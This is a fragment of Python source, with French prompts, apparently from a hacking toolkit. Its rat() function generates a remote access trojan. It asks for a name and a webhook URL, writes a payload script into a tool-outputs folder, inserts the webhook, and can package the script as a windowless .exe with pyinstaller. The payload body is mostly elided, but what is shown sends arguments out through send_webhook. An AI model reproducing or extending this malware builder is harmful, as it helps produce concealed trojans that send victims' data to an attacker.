...
def rat():
    ...
    clear()
    rat_banner()
    ratname = input(f"{y}[{b}#{y}]{w}Entre le nom que tu veux donner au rat:\n>>>")
    
    clear()
    rat_banner()
    ratwebhook = input(f"{y}[{b}#{y}]{w}Entre le webhook qui sera utilisé par le rat:\n>>>")
    
    clear()
    rat_banner()
    exe = input(f"{y}[{b}#{y}]{w}Voudras tu le convertir en exe ? (y/n):\n>>>")
    if exe == "y":
        resp_exe = "Ton rat sera converti en exe."
    elif exe == "n":
        resp_exe = "Ton rat ne sera pas converti en exe."
    else:
        error("Erreur lors de la saisie")
        rat()
    
    clear()
    rat_banner()
    input(f"{y}[{b}#{y}]{w}Ton rat sera crée dans le dossier: {getcwd()}/tool-outputs\n{y}[{b}#{y}]{w}Ton rat utilisera le webhook: {ratwebhook}\n{y}[{b}#{y}]{w}Ton rat se nomara: {ratname}\n{y}[{b}#{y}]{w}{resp_exe}\n{y}[{b}#{y}]{w}Appuyez sur entrée pour continuer...")
    
    clear()
    rat_banner()
    
    print(f"{y}[{b}#{y}]{w}Creation du fichier en cours...")
    newpath = f'{getcwd()}\\tool-outputs' 
    file = (r"""import os
import sys
...
if __name__ == "__main__":
    ...
    if len(sys.argv) == 1:
        ...
        del sys.argv[0]
        send_webhook(sys.argv)""").replace('wbl', ratwebhook)
        
    if not os.path.exists(newpath):
        makedirs(newpath)
    with open(f"{getcwd()}\\tool-outputs\\{ratname}.py", "w") as f:
        f.write(file)
    clear()
    rat_banner()
    print(f"{y}[{b}#{y}]{w}Le rat à bien été crée !...")

    if exe == "y":
        clear()
        rat_banner()
        try:
            print(f"{y}[{b}#{y}]{w}Conversion en cours...")
            sys(f"pyinstaller -y -F -w {getcwd()}\\tool-outputs\\{ratname}.py")
            rmtree(f"{getcwd()}\\build")
            move(f"{getcwd()}\\dist\\{ratname}.exe", f"{getcwd()}\\tool-outputs")
            rmtree(f"{getcwd()}\\dist")
            try:
                remove(f"{ratname}.spec")
            except:
                pass
        except:
            error("Erreur lors de la conversion en exe")
            try:
                rmtree(f"{getcwd()}\\build")
                remove(f"{ratname}.spec")
            except:
    ...
    clear()
    rat_banner()
    input(f"{y}[{b}#{y}]{w}Le rat à été généré avec succès !...")